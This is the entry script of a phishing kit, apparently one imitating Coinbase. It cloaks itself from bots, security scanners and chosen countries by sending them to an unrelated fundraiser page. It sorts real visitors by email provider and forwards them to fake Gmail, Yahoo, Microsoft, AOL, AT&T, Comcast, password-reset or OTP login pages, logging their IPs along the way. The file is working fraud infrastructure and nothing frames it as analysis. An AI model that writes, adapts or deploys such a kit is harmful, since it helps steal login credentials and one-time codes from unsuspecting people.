
text/x-generic index.php ( PHP script, ASCII text, with CRLF line terminators )
<?php 
session_start();
require_once('function/settings.php');
$mysettings = new Coinbasah();
// Read the JSON data from file
$json_data = file_get_contents('function/config.json');
// Decode JSON data into PHP array
$data = json_decode($json_data, true);
// Extract and decode the BlockCountry string into an array
$blockCountryString = $data['BlockCountry'];
// Remove the leading and trailing single quotes
$blockCountryString = trim($blockCountryString, "'");
// Replace the single quotes with double quotes to make it a valid JSON string
$blockCountryString = str_replace("'", '"', $blockCountryString);
// Decode the JSON string into an array
$blockCountries = json_decode($blockCountryString, true);

// Ip Detection
$ip = $_SERVER['REMOTE_ADDR']; // Get the user's IP address
$apiUrl = "http://ipinfo.io/{$ip}/json";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
$datasa = json_decode($response, true);
if(isset($datasa['country'])){
    $negaranya = $datasa['country'];
}else{
    $negaranya = 'N/N';
}
$_SESSION['Countrynya'] = $negaranya;
curl_close($ch);

if(empty($_SESSION['Userinfo'])){
    $_SESSION['Userinfo'] = $mysettings->generateRandomText(16);
}

if($data['StopbotStatus'] === 'on'){
    require_once('blocker/stopbot.php');
}
if($data['antibotStatus'] === 'on'){
    require_once('blocker/blocker.php');
}
if($data['IQSStatus'] === 'on'){
    require_once('blocker/blocked.php');
}

if ($mysettings->isMobile()) {
    // Redirect to the mobile page
    $devices = "<i class='fa-solid fa-mobile-screen-button'></i>";
} else {
    $devices = "<i class='fa-solid fa-desktop'></i>";
}

// Ip Detection
$ip = $_SERVER['REMOTE_ADDR']; // Get the user's IP address
$apiUrl = "http://ipinfo.io/{$ip}/json";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
$datasa = json_decode($response, true);
curl_close($ch);
$code = explode("/",$_SERVER['REQUEST_URI']);
$short = end($code);
$params = $mysettings->getSettings();
if(isset($_GET['m']) && !empty($_GET['m'])){
    $_SESSION['Email'] = @$_GET['m'];
    function readBlacklist($filename) {
        $blacklist = array();
        if (file_exists($filename) && is_readable($filename)) {
            $file = fopen($filename, "r");
            if ($file) {
                while (($line = fgets($file)) !== false) {
                    $ip = trim($line);
                    $blacklist[] = $ip;
                }
                fclose($file);
            }
        }
        return $blacklist;
    }
    
    // Path to the blacklist file
    $blacklistFile = "log/blacklist.log";
    
    // Read the blacklist
    $blacklist = readBlacklist($blacklistFile);
    
    // Check if visitor's IP is in the blacklist
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $country = isset($datasa['country']) ? $datasa['country'] : 'UNKNOWN';
    $devices = isset($devices) ? $devices : 'UNKNOWN';
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    if (in_array($ip_address, $blacklist)) {
        $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|BLACKLIST|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
        file_put_contents('log/view.log', $log_entry , FILE_APPEND);
        header("Location: {$data['redirectblock']}");
        exit;
    }else{
    
        if($data['IQSStatus'] === 'on'){
            if ( !preg_match("/" . str_replace(' ', '|', strtolower($ISP)) . "/", $words)
                && $fraud_score <= $score
                && $vpn === false 
            && in_array($country_code, $blockCountries)) {
                $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|HUMAN|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
                file_put_contents('log/view.log', $log_entry , FILE_APPEND);
                $log_entrys = "{$_SERVER['REMOTE_ADDR']}\r\n";
                file_put_contents('log/real.log', $log_entrys , FILE_APPEND);
                    $_SESSION['Status'] = 'ResetPassword';
                    header("Location: forgot_password?c_ds_na=".$mysettings->generateRandomText(42)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                    exit;
            }else{
                $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|BLOCKED|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
            
                file_put_contents('log/view.log', $log_entry , FILE_APPEND);
                // Make sure to exit after sending the header to ensure the script stops executing
            header("Location: https://www.gofundme.com/f/nicole-angelic");
            exit;
            }
        }else{
            $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|HUMAN|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
            file_put_contents('log/view.log', $log_entry , FILE_APPEND);
            $log_entrys = "{$_SERVER['REMOTE_ADDR']}\r\n";
            file_put_contents('log/real.log', $log_entrys , FILE_APPEND);
            $_SESSION['Status'] = 'ResetPassword';
            header("Location: forgot_password?c_ds_na=".$mysettings->generateRandomText(42)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        }
    }
}elseif(isset($_GET['code']) && !empty($_GET['code'])){
    $_SESSION['Email'] = @$_GET['code'];
   function readBlacklist($filename) {
        $blacklist = array();
        if (file_exists($filename) && is_readable($filename)) {
            $file = fopen($filename, "r");
            if ($file) {
                while (($line = fgets($file)) !== false) {
                    $ip = trim($line);
                    $blacklist[] = $ip;
                }
                fclose($file);
            }
        }
        return $blacklist;
    }
    
    // Path to the blacklist file
    $blacklistFile = "log/blacklist.log";
    
    // Read the blacklist
    $blacklist = readBlacklist($blacklistFile);
    
    // Check if visitor's IP is in the blacklist
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $country = isset($datasa['country']) ? $datasa['country'] : 'UNKNOWN';
    $devices = isset($devices) ? $devices : 'UNKNOWN';
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    if (in_array($ip_address, $blacklist)) {
        $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|BLACKLIST|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
        file_put_contents('log/view.log', $log_entry , FILE_APPEND);
        header("Location: {$data['redirectblock']}");
        exit;
    }else{
        if($data['IQSStatus'] === 'on'){
           if ( !preg_match("/" . str_replace(' ', '|', strtolower($ISP)) . "/", $words)
               && $fraud_score <= $score
               && $vpn === false 
           && in_array($country_code, $blockCountries)) {
               $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|HUMAN|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
               file_put_contents('log/view.log', $log_entry , FILE_APPEND);
               $log_entrys = "{$_SERVER['REMOTE_ADDR']}\r\n";
               file_put_contents('log/real.log', $log_entrys , FILE_APPEND);
                    $_SESSION['Status'] = 'Email';
                    if(strtolower(preg_match('/@gmail/', $_SESSION['Email']))) {
                        header("Location: gmail?c_ds_na=".$mysettings->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                        exit;
                    }elseif(strtolower(preg_match('/@(yahoo|ymail)/', $_SESSION['Email']))){
                        header("Location: yahoo?c_ds_na=".$mysettings->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                        exit;
                    }elseif(strtolower(preg_match('/@(hotmail|outlook|live|msn)/', $_SESSION['Email']))){
                        header("Location: microsoft?c_ds_na=".urlencode($_SERVER['HTTP_ACCEPT'])."&c_ds_no=".$mysettings->generateRandomText(42));
                        exit;
                    }elseif(strtolower(preg_match('/@aol/', $_SESSION['Email']))){
                        header("Location: aol?c_ds_na=".urlencode($_SERVER['HTTP_ACCEPT'])."&c_ds_no=".$mysettings->generateRandomText(42));
                        exit;
                        
                    }elseif(strtolower(preg_match('/@(att|ameritech|sbcglobal|bellsouth|flash|nvbell|pacbell|prodigy|snet|swbell)/', $_SESSION['Email']))){
                        header("Location: att?".$mysettings->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                        exit;
                    }elseif (preg_match('/@(comcast|xfinity)/', strtolower($_SESSION['Email']))) {
                        header("Location: comcast?".$mysettings->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                    } else{
                        $_SESSION['Status'] = 'otp';
                        header("Location: loginotp?c_ds_na=".$mysettings->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                        exit;
                    }
                    exit();
           }else{
               $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|BLOCKED|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
           
               file_put_contents('log/view.log', $log_entry , FILE_APPEND);
               // Make sure to exit after sending the header to ensure the script stops executing
           header("Location: https://www.gofundme.com/f/nicole-angelic");
           exit;
            }
       }else{
           $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|HUMAN|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
           file_put_contents('log/view.log', $log_entry , FILE_APPEND);
           $log_entrys = "{$_SERVER['REMOTE_ADDR']}\r\n";
           file_put_contents('log/real.log', $log_entrys , FILE_APPEND);
           $_SESSION['Status'] = 'Email';
           if(strtolower(preg_match('/@gmail/', $_SESSION['Email']))) {
               header("Location: gmail?c_ds_na=".$mysettings->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
               exit;
           }elseif(strtolower(preg_match('/@(yahoo|ymail)/', $_SESSION['Email']))){
               header("Location: yahoo?c_ds_na=".$mysettings->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
               exit;
           }elseif(strtolower(preg_match('/@(hotmail|outlook|live|msn)/', $_SESSION['Email']))){
               header("Location: microsoft?c_ds_na=".urlencode($_SERVER['HTTP_ACCEPT'])."&c_ds_no=".$mysettings->generateRandomText(42));
               exit;
           }elseif(strtolower(preg_match('/@aol/', $_SESSION['Email']))){
               header("Location: aol?c_ds_na=".urlencode($_SERVER['HTTP_ACCEPT'])."&c_ds_no=".$mysettings->generateRandomText(42));
               exit;
               
           }elseif(strtolower(preg_match('/@(att|ameritech|sbcglobal|bellsouth|flash|nvbell|pacbell|prodigy|snet|swbell)/', $_SESSION['Email']))){
               header("Location: att?".$mysettings->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
               exit;
           }elseif (preg_match('/@(comcast|xfinity)/', strtolower($_SESSION['Email']))) {
               header("Location: comcast?".$mysettings->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
           } else{
               $_SESSION['Status'] = 'otp';
               header("Location: loginotp?c_ds_na=".$mysettings->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
               exit;
           }
           exit();
       }
    }
}elseif($short === "?{$data['parameter']}"){
    function readBlacklist($filename) {
       $blacklist = array();
       $file = fopen($filename, "r");
       if ($file) {
           while (($line = fgets($file)) !== false) {
               $ip = trim($line);
               $blacklist[] = $ip;
           }
           fclose($file);
       }
       return $blacklist;
   }
    // Path to the blacklist file
    $blacklistFile = "log/blacklist.log";
    // Read the blacklist
    $blacklist = readBlacklist($blacklistFile);
    // Check if visitor's IP is in the blacklist
    if (in_array($_SERVER['REMOTE_ADDR'], $blacklist)) {
        $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|BLACKLIST|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
        $log_entrys = "{$_SERVER['REMOTE_ADDR']}\r\n";
        file_put_contents('log/view.log', $log_entry , FILE_APPEND);
        file_put_contents('log/blackvisit.log', $log_entrys , FILE_APPEND);
        header("Location: {$data['redirectblock']}");
        exit;
    }else{
   
       if($data['IQSStatus'] === 'on'){
            file_put_contents('log/view.log', $log_entry , FILE_APPEND);
            if ( !preg_match("/" . str_replace(' ', '|', strtolower($ISP)) . "/", $words)
                && $fraud_score <= $score
                && $vpn === false 
            && in_array($country_code, $blockCountries)) {
                $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|HUMAN|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
                file_put_contents('log/view.log', $log_entry , FILE_APPEND);
                $log_entrys = "{$_SERVER['REMOTE_ADDR']}\r\n";
                file_put_contents('log/real.log', $log_entrys , FILE_APPEND);
                    $_SESSION['Status'] = 'Signin';
                    header("Location: signin?c_ds_na=".$mysettings->generateRandomText(42)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                    exit;
            }else{
                $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|BLOCKED|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
                
                file_put_contents('log/view.log', $log_entry , FILE_APPEND);
                // Make sure to exit after sending the header to ensure the script stops executing
            header("Location: https://www.gofundme.com/f/nicole-angelic");
            exit;
            }
        }else{
            $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|HUMAN|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
            file_put_contents('log/view.log', $log_entry , FILE_APPEND);
            $log_entrys = "{$_SERVER['REMOTE_ADDR']}\r\n";
            file_put_contents('log/real.log', $log_entrys , FILE_APPEND);
            $_SESSION['Status'] = 'Signin';
            header("Location: signin?c_ds_na=".$mysettings->generateRandomText(42)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        }
    }
}else{
    $log_entry = "{$_SERVER['REMOTE_ADDR']}|".date('Y-m-d H:i:s')."|{$datasa['country']}|ROBOT|$devices|{$_SERVER['HTTP_USER_AGENT']}\r\n";
    file_put_contents('log/view.log', $log_entry , FILE_APPEND);
    // Make sure to exit after sending the header to ensure the script stops executing
    header("Location: https://www.gofundme.com/f/nicole-angelic");
    exit;
}
?>